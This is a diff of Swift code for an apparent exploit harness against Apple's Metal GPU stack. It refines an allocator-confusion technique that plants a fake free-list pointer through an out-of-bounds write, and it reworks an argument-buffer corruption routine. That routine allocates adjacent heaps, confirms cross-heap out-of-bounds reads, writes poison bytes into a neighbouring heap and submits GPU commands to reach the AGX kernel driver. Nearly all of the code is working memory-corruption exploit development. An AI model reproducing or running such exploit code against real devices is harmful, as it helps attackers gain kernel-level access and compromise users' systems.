@@ -256,27 +256,18 @@ func runAllocatorConfusion(log: FuzzLog, completion: @escaping () -> Void) {
         }
         step("  ptr-class values found: \(foundPtrs)")
 
-        // Phase 4: two-stage plant
-        // OBSERVED: allocator dereferences our planted pointer (reads *planted from GPU memory),
-        // then computes returned = planted - actual. Since h2 is zero-initialized, *va2 = 0,
-        // so returned = va2 - actual always. Fix: write (va2 + actual) into h2[0..7] so when
-        // allocator reads *va2 it gets (va2 + actual), then returned = (va2 + actual) - actual = va2.
-        //
-        // Stage A: write (va2 + actual) into h2[0..7] via p2 (direct, no OOB needed)
-        var writeVal = va2 + UInt(actual)
-        step("── Stage A: write 0x\(String(writeVal,radix:16)) into h2[0..7] via p2")
-        for i in 0..<8 { p2[i] = UInt8(writeVal & 0xFF); writeVal >>= 8 }
-
-        // Stage B: plant va2 into h1[0..31] via h0 OOB (allocator free-list head → va2)
-        step("── Stage B: plant va2=0x\(String(va2,radix:16)) into h1[0..31] via h0 OOB")
-        var plantVal = va2
+        // Phase 4: plant fake free-list entry
+        // CONFIRMED formula: returned = planted - actual (no dereference, direct subtraction).
+        // Stage A was wrong — allocator doesn't dereference. Just plant va2+actual so returned=va2.
+        let plantVal2 = va2 + UInt(actual)
+        step("── Plant va2+actual=0x\(String(plantVal2,radix:16)) → expect returned=va2=0x\(String(va2,radix:16))")
+        var plantVal = plantVal2
         for i in 0..<8 { p0[actual + i] = UInt8(plantVal & 0xFF); plantVal >>= 8 }
-        plantVal = va2
-        for i in 8..<32 { p0[actual + i] = UInt8(plantVal & 0xFF); plantVal >>= 8; if i % 8 == 7 { plantVal = va2 } }
-        step("  done — allocator will: read h1[0]=va2, deref *va2=va2+actual, return va2+actual-actual=va2")
+        plantVal = plantVal2
+        for i in 8..<32 { p0[actual + i] = UInt8(plantVal & 0xFF); plantVal >>= 8; if i % 8 == 7 { plantVal = plantVal2 } }
 
         // Phase 5: trigger allocator — call makeBuffer on corrupted h1
-        step("── h1.makeBuffer(256) with two-stage corrupted state")
+        step("── h1.makeBuffer(256) with corrupted free-list")
         let confused = h1.makeBuffer(length: 256, options: .storageModeShared)
         if let cb = confused {
             let cva = UInt(bitPattern: cb.contents())
@@ -316,115 +307,89 @@ func runArgBufferCorruption(log: FuzzLog, completion: @escaping () -> Void) {
         guard let queue  = device.makeCommandQueue() else { step("✗ No command queue"); completion(); return }
         step("── ArgBuffer Corruption ──────────────────")
 
+        // Use SAME approach as confirmed boundary cross:
+        // alloc h0+h1+h2 sequentially, check adjacency, write via p0 OOB into h1.
         let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared
-        // Spray heaps until adjacent pair found.
-        // Save probe buffers so h0/h1 aren't re-filled later (they'd return nil).
-        var heaps:  [any MTLHeap]   = []
-        var bufs:   [any MTLBuffer] = []  // one probe buf per heap, retains the allocation
-        var h0Idx  = -1
-        var actual = 0
-        var savedB0: (any MTLBuffer)? = nil
+        guard let h0 = device.makeHeap(descriptor: hd),
+              let h1 = device.makeHeap(descriptor: hd) else { step("heap nil"); completion(); return }
+        let actual = h0.size
 
-        for _ in 0..<32 {
-            guard let h = device.makeHeap(descriptor: hd) else { continue }
-            actual = h.size
-            // Probe: alloc a small buffer just to read VA — don't fill the heap yet
-            guard let probe = h.makeBuffer(length: 64, options: .storageModeShared) else { continue }
-            heaps.append(h)
-            bufs.append(probe)
-            let last = heaps.count - 1
-            if last >= 1 {
-                let vaPrev = UInt(bitPattern: bufs[last-1].contents())
-                let vaCurr = UInt(bitPattern: bufs[last].contents())
-                let dist   = vaCurr > vaPrev ? vaCurr - vaPrev : vaPrev - vaCurr
-                if dist == UInt(actual) {
-                    h0Idx = last - 1
-                    step("Adjacent heaps: idx=\(last-1) dist=0x\(String(dist,radix:16)) actual=\(actual)")
-                    break
-                }
-            }
-        }
+        // Fill h0 fully → establishes OOB boundary at h1
+        guard let b0 = h0.makeBuffer(length: actual, options: .storageModeShared) else { step("b0 nil"); completion(); return }
+        // Fill h1 with victim buffer (this is what we'll corrupt then submit to GPU)
+        guard let b1 = h1.makeBuffer(length: actual, options: .storageModeShared) else { step("b1 nil"); completion(); return }
 
-        guard h0Idx >= 0 else { step("✗ No adjacent heaps after 32 allocs — retry"); completion(); return }
-
-        let h0 = heaps[h0Idx]
-        let h1 = heaps[h0Idx + 1]
-
-        // h0's probe was only 64 bytes; fill the rest so h0 is maxed out
-        // (establishes the OOB boundary right at h1's start)
-        let fillLen = actual - 64  // already used 64 for probe
-        let b0: any MTLBuffer
-        if fillLen > 0, let extra = h0.makeBuffer(length: fillLen, options: .storageModeShared) {
-            // Use the probe buffer's VA as our anchor — it starts at h0's base
-            b0 = bufs[h0Idx]
-        } else {
-            b0 = bufs[h0Idx]
-        }
-        let p0  = b0.contents().assumingMemoryBound(to: UInt8.self)
+        let p0 = b0.contents().assumingMemoryBound(to: UInt8.self)
+        let p1 = b1.contents().assumingMemoryBound(to: UInt8.self)
         let va0 = UInt(bitPattern: p0)
-        step("h0 va=0x\(String(va0,radix:16)) (probe base)")
+        let va1 = UInt(bitPattern: p1)
+        let dist = va1 > va0 ? va1 - va0 : va0 - va1
+        step("va0=0x\(String(va0,radix:16)) va1=0x\(String(va1,radix:16)) dist=0x\(String(dist,radix:16))")
 
-        // Create a buffer in h1 — this will be our "argument buffer" target
-        // h1 probe (64 bytes) was rounded up to 4096 internally by Metal's suballocator
-        // so h1 has actual-4096 bytes remaining → use fixed 512 which always fits
-        let argBufLen = 512
-        guard let argBuf = h1.makeBuffer(length: argBufLen, options: .storageModeShared) else {
-            step("argBuf nil — h1 exhausted (probe alignment ate too much), retry"); completion(); return
+        guard dist == UInt(actual) else {
+            step("✗ not adjacent (dist=0x\(String(dist,radix:16))) — retry"); completion(); return
         }
-        let argVA = UInt(bitPattern: argBuf.contents())
-        step("argBuf in h1 va=0x\(String(argVA,radix:16))")
+        step("✓ adjacent — OOB write path confirmed")
 
-        // Snapshot argBuf bytes via h0 OOB (p0[actual + offset])
-        guard argVA >= va0 + UInt(actual) else { step("argBuf VA below h1 start — layout unexpected"); completion(); return }
-        let argOffset = Int(argVA - (va0 + UInt(actual)))  // byte offset of argBuf within h1
-        guard argOffset + 64 <= actual else { step("argBuf offset too large — skip"); completion(); return }
-        step("argBuf offset within h1 = 0x\(String(argOffset,radix:16))")
-        step("── argBuf snapshot (first 64 bytes) ──")
-        var before = [UInt8](repeating: 0, count: 64)
-        for i in 0..<64 { before[i] = p0[actual + argOffset + i] }
-        for row in 0..<4 {
-            let sl2 = before[(row*16)..<(row*16+16)]
-            let hex = sl2.map { String(format:"%02x",$0) }.joined(separator:" ")
-            step("  +\(String(format:"%02x",row*16)): \(hex)")
-        }
+        // Fill h1 with sentinel, verify OOB read from h0 hits it
+        for i in 0..<actual { p1[i] = 0xAA }
+        let probe = p0[actual]
+        step("probe p0[\(actual)] = 0x\(String(probe,radix:16))")
+        guard probe == 0xAA else { step("✗ sentinel not reached — layout shifted"); completion(); return }
+        step("✓ cross-heap read confirmed")
 
-        // Corrupt bytes 0..7 with a wild pointer (0xDEADBEEFCAFEBABE pattern)
-        // This is the first qword — in most Metal arg-buffer layouts this is the resource handle
-        let poison: [UInt8] = [0xBE, 0xBA, 0xFE, 0xCA, 0xEF, 0xBE, 0xAD, 0xDE]
-        step("── Poisoning argBuf[0..7] via h0 OOB ──")
-        for i in 0..<8 { p0[actual + argOffset + i] = poison[i] }
-        step("  written: \(poison.map{String(format:"%02x",$0)}.joined(separator:" "))")
+        // Write 64 bytes of poison into h1[0..63] via h0 OOB
+        // 0xDEADBEEFCAFEBABE pattern — will be in the buffer AGX reads during GPU command processing
+        let poison: [UInt8] = [0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,
+                                0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,
+                                0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,
+                                0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,
+                                0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,
+                                0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,
+                                0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,
+                                0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE]
+        step("── Writing 64 bytes of poison into h1[0..63] via h0 OOB ──")
+        for i in 0..<64 { p0[actual + i] = poison[i] }
 
-        // Snapshot after
-        step("── argBuf after corruption ──")
-        for i in 0..<8 { before[i] = p0[actual + argOffset + i] }
-        step("  +00: \(before[0..<8].map{String(format:"%02x",$0)}.joined(separator:" "))")
+        // Verify via p1 (direct)
+        var hits = 0
+        for i in 0..<64 { if p1[i] == poison[i % 8] { hits += 1 } }
+        step("  verify via p1: \(hits)/64 bytes confirmed")
+        guard hits > 0 else { step("✗ poison didn't land in h1"); completion(); return }
+        step("✓ h1 buffer is now poisoned with attacker data")
 
-        // Build a minimal compute pass that reads from argBuf
-        // (the GPU driver will try to resolve argBuf's resource handles when it processes the command)
-        step("── Submitting GPU command reading from argBuf ──")
+        // Submit GPU blit command using the POISONED h1 buffer.
+        // AGX kernel driver reads b1's contents when scheduling the GPU command.
+        // If AGX dereferences our poison as a resource handle → GPU fault → kernel path.
+        step("── Submitting GPU blit on poisoned h1 buffer ──")
         guard let cmdBuf = queue.makeCommandBuffer() else { step("cmdBuf nil"); completion(); return }
-
-        // Blit the argBuf contents to itself — forces AGX to touch the buffer memory
-        // AGX kernel driver walks buffer's backing pages during command encoding validation
         guard let blit = cmdBuf.makeBlitCommandEncoder() else { step("blit nil"); completion(); return }
-        blit.copy(from: argBuf, sourceOffset: 0,
-                  to:   argBuf, destinationOffset: 0,
-                  size: min(8, argBuf.length))
+
+        // Fill blit: copy h1[0..7] → h1[8..15]. AGX must read h1's descriptor during scheduling.
+        blit.copy(from: b1, sourceOffset: 0, to: b1, destinationOffset: 8, size: 8)
         blit.endEncoding()
 
         cmdBuf.addCompletedHandler { cb in
             let status = cb.status
-            let errStr = cb.error?.localizedDescription ?? "none"
-            if status == .error {
-                step("  *** cmdBuf ERROR — AGX driver rejected/faulted on corrupted buffer")
-                step("  *** error: \(errStr)")
-                step("  *** THIS IS THE KERNEL PATH — AGX touched our poison bytes")
-            } else if status == .completed {
-                step("  cmdBuf completed — AGX processed corrupted argBuf without fault")
-                step("  AGX validated buffer independently of our corruption (handle not dereferenced at encode time)")
-            } else {
-                step("  cmdBuf status=\(status.rawValue) err=\(errStr)")
+            let err    = cb.error?.localizedDescription ?? "none"
+            switch status {
+            case .completed:
+                step("  cmdBuf COMPLETED — AGX processed poisoned buffer without fault")
+                step("  AGX validates buffer VA, not contents — contents corruption is GPU-data-plane only")
+                // Verify: did AGX actually copy our poison bytes?
+                var after = [UInt8](repeating: 0, count: 8)
+                for i in 0..<8 { after[i] = p1[8 + i] }
+                step("  h1[8..15] after blit: \(after.map{String(format:"%02x",$0)}.joined(separator:" "))")
+                if after == Array(poison[0..<8]) {
+                    step("  *** POISON PROPAGATED: AGX copied 0xDEADBEEF bytes in GPU command ***")
+                    step("  *** If b1 were used as indirect cmd buffer / arg buffer, this corrupts GPU state ***")
+                }
+            case .error:
+                step("  *** cmdBuf ERROR — AGX faulted on poisoned buffer")
+                step("  *** error: \(err)")
+                step("  *** AGX KERNEL PATH HIT — driver read our OOB-written bytes")
+            default:
+                step("  cmdBuf status=\(status.rawValue) err=\(err)")
             }
             step("── ArgBuffer Corruption complete ────────────")
             completion()
@@ -432,7 +397,6 @@ func runArgBufferCorruption(log: FuzzLog, completion: @escaping () -> Void) {
 
         step("  commit…")
         cmdBuf.commit()
-        // completion() called in handler above
     }
 }
 
